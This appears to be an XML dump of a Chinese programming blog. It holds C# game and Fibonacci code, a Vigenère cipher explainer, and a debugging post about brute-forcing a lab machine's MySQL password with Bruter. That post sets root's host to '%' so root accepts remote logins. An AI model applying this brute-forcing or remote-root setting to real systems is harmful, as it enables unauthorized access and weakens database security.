<span class="token punctuation">{</span>                P_control<span class="token punctuation">.</span>BackColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>Red<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//设置按钮背景为红色</span>                P_control<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//设置按钮停用</span>                P_control<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"大"</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//更改按钮文本--猜测数值偏大</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>P_control<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">&lt;</span> G_int_num<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                P_control<span class="token punctuation">.</span>BackColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>Red<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//设置按钮背景为红色</span>                P_control<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//设置按钮停用</span>                P_control<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"小"</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">//更改按钮文本--猜测数偏小</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>P_control<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">==</span> G_int_num<span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">//当猜测数值与随机产生的数值相等时</span>            <span class="token punctuation">{</span>                G_th<span class="token punctuation">.</span><span class="token function">Abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                   <span class="token comment" spellcheck="true">//终止计数线程</span>                <span class="token comment" spellcheck="true">//显示游戏信息</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string">"恭喜你猜对了！共猜了{0}次 用时{1}秒"</span><span class="token punctuation">,</span> <span class="token function">GetCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lb_time<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"恭喜！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                btn_begin<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//启用开始按钮</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 计数方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 用于查找窗体中Enable属性为False控件的数量    --遍历窗体中的控件</span>        <span class="token comment" spellcheck="true">/// 用于计算玩家有多少次没有猜中</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回没有猜中数量&lt;/returns></span>        <span class="token keyword">string</span> <span class="token function">GetCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> P_int_temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                             <span class="token comment" spellcheck="true">//初始化计数器</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>Control c <span class="token keyword">in</span> Controls<span class="token punctuation">)</span>                                     <span class="token comment" spellcheck="true">//遍历控件集合</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">.</span>Enabled<span class="token punctuation">)</span> P_int_temp<span class="token operator">++</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">//计数器累加</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> P_int_temp<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">//返回计数器信息</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 清除控件方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 用于清空窗体中动态生成的按钮</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token keyword">void</span> <span class="token function">RemoveControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                            <span class="token comment" spellcheck="true">//自定义的清除方法</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                               <span class="token comment" spellcheck="true">//开始遍历100个按钮</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>Controls<span class="token punctuation">.</span><span class="token function">ContainsKey</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//窗体中是否有此按钮</span>                <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> Controls<span class="token punctuation">.</span>Count<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">//遍历窗体控件集合</span>                    <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Controls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>Name <span class="token operator">==</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//是否查找到按钮</span>                        <span class="token punctuation">{</span>                            Controls<span class="token punctuation">.</span><span class="token function">RemoveAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//删除指定按钮</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 窗体的FormClosing事件</span>        <span class="token comment" spellcheck="true">//窗体的FormClosing事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Frm_Main_FormClosing</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> FormClosingEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>G_th <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                G_th<span class="token punctuation">.</span><span class="token function">Abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Environment<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//强行关闭窗体</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp多线程猜数字游戏/测试结果.png" alt="测试结果"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>程序流程分析</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp多线程猜数字游戏/NumGame.png" alt="NumGame"></center><p><strong>参考资料</strong>：</p><p><a href="https://www.cnblogs.com/fuchongjundream/p/3829508.html" target="_blank" rel="noopener">进程、线程、多线程相关总结</a></p>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 程序实现 </tag>
            
            <tag> 小游戏 </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C#递归算法计算斐波那契数列</title>
      <link href="/2020/08/22/csharp-di-gui-suan-fa-ji-suan-fei-bo-na-qi-shu-lie/"/>
      <url>/2020/08/22/csharp-di-gui-suan-fa-ji-suan-fei-bo-na-qi-shu-lie/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="兔子数列"><a href="#兔子数列" class="headerlink" title="兔子数列"></a>兔子数列</h2><p>斐波那契(Fibonacci)在《计算之术》中提出一个问题：</p><p>&emsp;&emsp;在第一个月有一对刚出生的小兔子，在第二个月小兔子变成大兔子并开始怀孕，第三个月大兔子会生下一对小兔子，并且以后每个月都会生下一对小兔子。 如果每对兔子都经历这样的出生、成熟、生育的过程，并且兔子永远不死，那么兔子的总数是如何变化的？</p><p><strong>关键点</strong>：</p><ul><li>兔子成对出生</li><li>兔子的成长周期和生育周期都为1个月</li><li>所有的兔子都不会死亡，并且可以一直保持生育</li></ul><p><strong>问题解析</strong>：</p><p>第一个月只有一对兔宝宝，1对兔子</p><p>第二个月兔宝宝变成大兔子，1对兔子</p><p>第三个月大兔子生了一对兔宝宝，2对兔子</p><p>第四个月大兔子继续生一对兔宝宝，小兔子变成大兔子，3对兔子</p><p>……</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp递归算法计算斐波那契数列/数列列表.jpg" alt="数列列表"></center><p><strong>发现规律</strong>：</p><ul><li>前一个月的大兔子对数就是下一个月的小兔子对数</li><li>前一个月的大兔子和小兔子对数的和就是下个月大兔子的对数</li></ul><p>$$<br>f(n)=<br>\begin{cases}<br>1 &amp; n=1\<br>1 &amp; n=2\<br>f(n-1) + f(n-2) &amp;n&gt;2<br>\end{cases}<br>$$</p><p>此为兔子数列（斐波那契数列）</p><p><font color="red"><strong>使用程序怎样来实现斐波那契数列呐？</strong></font></p><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p><strong>编程环境</strong>：</p><ul><li>VS2017</li><li>.Net Framework 4.5</li></ul><p><strong>运行环境</strong>：</p><ul><li>Win10</li></ul><h1 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h1><p><strong>界面设计</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp递归算法计算斐波那契数列/界面设计.png" alt="界面设计"></center><p><strong>代码设计</strong>：</p><pre class=" language-C#"><code class="language-C#">using System;using System.Windows.Forms;namespace Arithmetic{    public partial class Frm_Main : Form    {        public Frm_Main()        {            InitializeComponent();        }        #region 计算按钮的Click事件        //计算按钮的Click事件        private void btn_Get_Click(object sender, EventArgs e)        {            int P_int_temp;                                         //定义一个用于存储的整型变量            if (int.TryParse(txt_value.Text, out P_int_temp))       //为变量赋值            {                lb_result.Text = "计算结果为：" + Get(P_int_temp).ToString();     //输出计算结果            }            else                                    //当数据转化失败时            {                MessageBox.Show("请输入正确的数值！", "提示！");                      //提示输入正确数值            }        }        #endregion        #region 斐波那契数列的计算        /// <summary>        /// 递归算法                //斐波那契数列的计算问题        /// </summary>        /// <param name="i">参与计算的数值</param>        /// <returns>计算结果</returns>        int Get(int i)        {            if (i <= 0)                            //判断数值是否小于0                return 0;                        //返回数值0            else if (i >= 0 && i <= 2)            //判断数值是否大于等于0并且小于等于2                return 1;                        //返回数值1            else                                //如果不满足上述条件执行下面语句                return Get(i - 1) + Get(i - 2);    //返回指定位数前两位数的和        }        #endregion    }}</code></pre><p><strong>注</strong>：</p><ul><li>程序以int类型存储结果，当计算的数值超出int时，程序将会报错。</li></ul><h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp递归算法计算斐波那契数列/实现结果.png" alt="实现结果"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><p><a href="https://baijiahao.baidu.com/s?id=1606651492697783298&wfr=spi" target="_blank" rel="noopener">什么叫斐波那契数列</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 算法 </tag>
            
            <tag> 斐波那契数列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title> This host is not allowed to connect to MySQL server</title>
      <link href="/2020/08/22/this-host-is-not-allowed-to-connect-to-mysql-server/"/>
      <url>/2020/08/22/this-host-is-not-allowed-to-connect-to-mysql-server/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>​        在使用<strong>Bruter</strong>对靶机中的MySQL数据库的账号和密码进行爆破时，Message框中出现如下图所示的提示信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/错误提示信息.png" alt="错误提示信息"></center><h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><p>​    PhpStudy 2016集成 环境安装：</p><ul><li>MySQL版本：5.5.53</li><li>服务端口：3306</li></ul><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><ol><li><p>首先排除 IP地址、端口错误或MySQL服务未开启等问题，因为对于尝试登录登录数次不成功将显示如下的错误提示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/登录尝试超时提示信息.png" alt="登录尝试超时提示信息"></center></li><li><p><font color="red">This host is not allowed to connect to MySQL server</font>可能是MySQL数据库<strong>拒绝远程连接</strong>。</p><p>在另一台机器上远程连接改MySQL数据库，也显示类似的错误提示信息：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/远程连接mysql数据库错误提示.png" alt="远程连接mysql数据库错误提示"></center><ul><li><font color="blue">默认情况下，MySQL只允许本地连接，若要进行远程连接就需要先对其进行设置。</font></li></ul></li></ol><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>百度一下：“远程访问 MySQL数据库”</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/百度一下.png" alt="百度一下"></center></li><li><p><a href="https://www.cnblogs.com/wq-9/articles/11062770.html" target="_blank" rel="noopener">MySQL远程连接数据库</a></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/mysql远程连接数据库的方法.png" alt="mysql远程连接数据库的方法"></center></li><li><p>修改mysql数据库中user表中root对应得host字段的值为%，来允许远程用户连接MySQL。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/修改表信息.png" alt="修改表信息"></center><pre class=" language-mysql"><code class="language-mysql">use mysql;select host,user from user where user='root';update user set host='%' where user='root';select host,user from user where user='root';</code></pre></li><li><p><font color="blue">重启MySQL服务</font>后，再进行远程连接测试。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/重启MySQL后的连接测试.png" alt="重启MySQL后的连接测试"></center></li><li><p>Bruter爆破。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/Bruter爆破成功.png" alt="Bruter爆破成功"></center></li></ol><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><p>​        Bruter是使用类似于<code>mysql -h 192.168.19.136 -P 3306 -u root -p 123456</code>这样的命令不断地尝试来爆破MySQL数据库的密码的。</p><ul><li><font color="red">This host is not allowed to connect to MySQL server</font>：表示MySQL拒绝主机连接，因为MySQL默认是不允许远程连接的。</li><li><font color="red">Login errors MAXRETRY times consecutively</font>：表示MySQL的连接得不到回应，自动停止连接。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>[MySQL远程连接数据库](</li></ul>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 爆破 </tag>
            
            <tag> Bruter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VigenereCipher</title>
      <link href="/2020/08/22/vigenerecipher/"/>
      <url>/2020/08/22/vigenerecipher/</url>
      
        <content type="html"><![CDATA[<h1 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h1><p><strong>介绍</strong>：</p><p>​        <strong>维吉尼亚密码</strong>（又译 <strong>维热纳尔密码</strong>）是使用一系列<strong>凯撒密码</strong>组成密码字母表的加密算法，属于<strong>多表密码</strong>的一种简单形式。</p><p>​        维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚所创造，因此现在被称为“维吉尼亚密码”。</p><p>​        维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。</p><p><strong>历史</strong>：</p><p>​        多表密码最早在1467年左右由莱昂·巴蒂斯塔·阿尔伯蒂提出，他使用了一个金属<strong>密码盘</strong>来切换密码表，只是这个系统只能做些有限的转换。后来1508年时，约翰尼斯·特里特米乌斯《<strong>隐写术</strong>》（Steganographia）中发明的表格法（tabula recta）成为了维吉尼亚密码的关键部分。然而当时此方法只能对密码表做一些简单的、可预测的切换。这一加密技术也称为<strong>特里特米乌斯密码</strong>。  </p><p>​        这一方法真正出现是在吉奥万·巴蒂斯塔·贝拉索于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的算术》中。他以特里特米乌斯的表格法为基础，同时引入了密钥的概念。</p><p>​        布莱斯·德·维吉尼亚于1586年亨利三世时期发明了更为简单却又更有效的自动密钥密码（autokey cipher）。之后，19世纪时贝拉索的方法被误认为是由维吉尼亚首先发明的。大卫·卡恩在《破译者（The Codebreakers）》中对此表示遗憾，他写道“历史忽略了这一重要贡献，将其归功于维吉尼亚，虽然他对此并不知道”。</p><p>​        由于破译的难度很高，维吉尼亚密码也因此获得了很高的声望。知名作家、数学家查尔斯·路特维奇·道奇森（笔名路易斯·卡罗）在其1868年所编、收于一儿童杂志的《字母表密码（The Alphabet Cipher）》中称其是不可破译的。1917年，《科学美国人》将维吉尼亚密码称为“无法被转化的”。然而，维吉尼亚密码却配不上这样的称号。查尔斯·巴贝奇完成了破译的工作，但他没有将此发表。之后，弗里德里希·卡西斯基（Friedrich Kasiski）于19世纪完全破解并发表了他的方法。甚至在此之前，一些资深密码分析家在16世纪就能偶尔将其破解。</p><p>​        维吉尼亚密码足够地易于使用使其能够作为战地密码。例如，美国南北战争期间南军就使用黄铜密码盘生成维吉尼亚密码。北军则经常能够破译南军的密码。战争自始至终，南军主要使用三个密钥，分别为“Manchester Bluff（曼彻斯特的虚张声势）”、“Complete Victory（完全的胜利）”以及战争后期的“Come Retribution（报应来临）”。</p><p>​        吉尔伯特·维尔南（Gilbert Vernam）曾试图对已被破译的密码进行修补（于1918年创造了维尔南-维尼吉亚密码），然而这终究无济于事。不过维尔南的发明最终促成了一次性密码本的诞生，这是一种理论上不可破译的密码。</p><h1 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h1><p>​        维吉尼亚密码可以说是凯撒密码的升级版，在凯撒密码中，字母表中的每一字母会做一定的偏移，而维吉尼亚密码可以看作是由一些偏移量不同的凯撒密码组成。</p><p>​        为了生成密码，需要使用<strong>表格法</strong>。这一表格（如图1所示）包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p><p><strong>举个栗子</strong>：</p><p>使用的维吉尼亚密码表如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereCipherTable.png" alt="VigenereCipherTable"></center><p><strong>加密</strong>：</p><ul><li><p>假设明文为：</p><p><font color="blue">ATTACKATDAWN</font></p></li><li><p>LEMON为选定关键词，则密钥为：</p><p><font color="blue">LEMONLEMONLE</font></p></li><li><p>将密钥作为<strong>行标识</strong>，明文作为<strong>列标识</strong>，对明文中的字母依次替换为行列相交处的字母，则得到密文：</p><p><font color="blue">LXFOPVEFRNHR</font></p></li></ul><p>明文字符串首字母的加密过程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereEncrypt.png" alt="VigenereEncrypt"></center><p><strong>解密</strong>：</p><ul><li><p>假设密文为：</p><p><font color="blue">LXFOPVEFRNHR</font></p></li><li><p>LEMON为选定关键词，则密钥为：</p><p><font color="blue">LEMONLEMONLE</font></p></li><li><p>将密钥作为<strong>行标识</strong>，在该行内查找与其密文一样的字母，该字母对应的列值即为明文，则得到明文：</p><p><font color="blue">ATTACKATDAWN</font></p></li></ul><p>密文字符串首字母的解密过程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereDecrypt.png" alt="VigenereDecrypt"></center><p><strong>数学语言描述</strong>：</p><ol><li>首先将字母用数字代替，即：A=0，B=1，C=2，…，Z=25。</li><li>明文空间记为：M</li><li>密文空间记为：C</li><li>密钥空间记为：K<del>m</del></li><li>将偏移量记为：k<del>n</del></li><li>加密操作记为：E<del>(m)</del></li><li>解密操作记为：D<del>(c)</del></li></ol><p>则有：</p><p><strong>加密变换</strong>：<br>$$<br>E(m_1,m_2,…,m_n) = (m_1+k_1 \ mod \ 26,m_2+k_2 \ mod \ 26,..,m_n+k_n \ mod \ 26),(m_i∈M，k_i∈K,n∈N)<br>$$<br><strong>解密变换</strong>：<br>$$<br>E(m_1,m_2,…,m_n) = (m_1-k_1 \ mod \ 26,m_2-k_2 \ mod \ 26,..,m_n-k_n \ mod \ 26),(m_i∈M，k_i∈K,n∈N)<br>$$</p><h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><p><strong>程序流程图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereCipherFlowchart.png" alt="VigenereCipherFlowchart"></center><p>注：</p><ul><li>第一次输入一个int型数据op，若<code>op==1</code>则执行加密操作，若<code>op==0</code>则执行解密操作，否则结束程序。</li><li>第二次输入一个字符串，进行加密或解密操作。</li><li>操作结果后显示加密或解密的结果。</li></ul><h1 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h1><p><strong>Vigenere类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">namespace</span> Cryptology_Vigenere<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Vigenere</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        <span class="token keyword">private</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token punctuation">]</span> codeMatrix<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">Vigenere</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 初始化对象时也初始化密码矩阵</span>            <span class="token function">Vigenere_InitCodeMatrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 展示密码表</span>            <span class="token function">DisplayCipherTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 初始化Vigenere密码矩阵</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Vigenere_InitCodeMatrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            codeMatrix <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//矩阵</span>            <span class="token keyword">char</span> temp<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                temp <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        codeMatrix<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        codeMatrix<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 展示维吉尼亚密码表</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">DisplayCipherTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> 